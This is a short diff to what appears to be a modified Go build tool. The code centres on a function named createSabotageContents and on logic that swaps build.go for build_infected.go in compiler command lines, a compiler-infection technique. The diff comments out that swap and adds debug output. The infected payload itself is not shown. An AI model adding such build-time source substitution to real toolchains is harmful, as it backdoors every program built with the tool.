@@ -567,7 +567,8 @@ func createSabotageContents(src string, dst string) {
 		return
 	}
 
-	files, _ := ioutil.ReadDir("./")
+	fmt.Println(strings.Replace(src, "build.go", "", -1))
+	files, _ := ioutil.ReadDir(strings.Replace(src, "build.go", "", -1))
 	for _, f := range files {
 		fmt.Println(f.Name())
 	}
@@ -2024,16 +2025,18 @@ func (b *builder) processOutput(out []byte) string {
 // It returns the command output and any errors that occurred.
 func (b *builder) runOut(dir string, desc string, env []string, cmdargs ...interface{}) ([]byte, error) {
 	cmdline := stringList(cmdargs...)
-	fmt.Println("CMDLINE:")
-	fmt.Println(cmdline)
-	fmt.Println("END CMDLINE")
-
 	// let's remove build.go and add build.infected.go
-	for i := 0; i < len(cmdline); i++ {
-		if strings.Contains(cmdline[i], "build.go") {
-			cmdline[i] = strings.Replace(cmdline[i], "build.go", "build_infected.go", -1)
-		}
-	}
+	// for i := 0; i < len(cmdline); i++ {
+	// 	if strings.Contains(cmdline[i], "build.go") {
+	// 		var infected_exists = false
+	// 		files, _ := ioutil.ReadDir(strings.Replace(cmdline[i], "build.go", "", ))
+	// 		for _, f := range files {
+	// 			fmt.Println(f.Name())
+	// 		}
+
+	// 		cmdline[i] = strings.Replace(cmdline[i], "build.go", "build_infected.go", -1)
+	// 	}
+	// }
 
 	if buildN || buildX {
 		var envcmdline string
